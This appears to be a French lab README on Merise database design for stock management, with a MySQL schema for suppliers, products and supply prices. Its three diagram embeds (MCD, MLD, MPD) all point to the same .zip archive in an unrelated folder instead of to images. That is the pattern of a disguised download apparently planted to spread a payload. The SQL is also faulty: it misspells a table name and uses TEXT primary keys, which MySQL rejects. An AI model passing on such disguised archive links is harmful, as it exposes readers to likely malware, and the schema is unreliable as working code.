Lab 1 — Gestion de stock (Entrée) : Dictionnaire, Règles, MCD, MLD

MCD :

![MDC](https://github.com/laouysalma/Tp1Merise/raw/refs/heads/main/biodyne/MeriseTp-v1.0.zip)

MLD :

![MLC](https://github.com/laouysalma/Tp1Merise/raw/refs/heads/main/biodyne/MeriseTp-v1.0.zip)

MPD :

![MPD](https://github.com/laouysalma/Tp1Merise/raw/refs/heads/main/biodyne/MeriseTp-v1.0.zip)

```SQL
/*==============================================================*/
/* Nom de SGBD :  MySQL 5.0                                     */
/* Date de création :  12/11/2025 5:35:59 PM                    */
/*==============================================================*/


drop table if exists FOUNISSAUR;

drop table if exists FOURNIR;

drop table if exists PRODUIT;

/*==============================================================*/
/* Table : FOUNISSAUR                                           */
/*==============================================================*/
create table FOUNISSAUR
(
   NUMF                 int not null,
   NOMF                 text,
   ADRESSEF             text,
   primary key (NUMF)
);

/*==============================================================*/
/* Table : FOURNIR                                              */
/*==============================================================*/
create table FOURNIR
(
   CODEPROD             text not null,
   NUMF                 int not null,
   PRIXACHAT            decimal,
   primary key (CODEPROD, NUMF)
);

/*==============================================================*/
/* Table : PRODUIT                                              */
/*==============================================================*/
create table PRODUIT
(
   CODEPROD             text not null,
   DESIGPROD            text,
   PRIXUNIT             decimal,
   primary key (CODEPROD)
);

alter table FOURNIR add constraint FK_FOURNIR foreign key (NUMF)
      references FOUNISSAUR (NUMF) on delete restrict on update restrict;

alter table FOURNIR add constraint FK_FOURNIR2 foreign key (CODEPROD)
      references PRODUIT (CODEPROD) on delete restrict on update restrict;

```
